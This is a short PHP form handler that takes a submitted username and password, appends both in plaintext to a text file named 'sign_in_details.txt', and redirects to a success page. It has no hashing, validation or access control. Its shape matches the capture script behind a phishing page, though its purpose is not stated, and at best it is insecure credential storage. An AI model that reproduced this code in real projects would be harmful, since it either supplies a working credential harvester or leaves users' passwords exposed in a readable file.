<?php
// Retrieve form data
$username = $_POST['username'];
$password = $_POST['password'];

// Further processing (e.g., validation, sanitization) of the form data can be done here

// Store the sign-in details in a text file
$file = 'sign_in_details.txt';
$current = file_get_contents($file);
$current .= "Username: $username, Password: $password\n";
file_put_contents($file, $current);

// Redirect the user to a success page or perform other actions as needed
header('Location: success.html');
exit();
?>
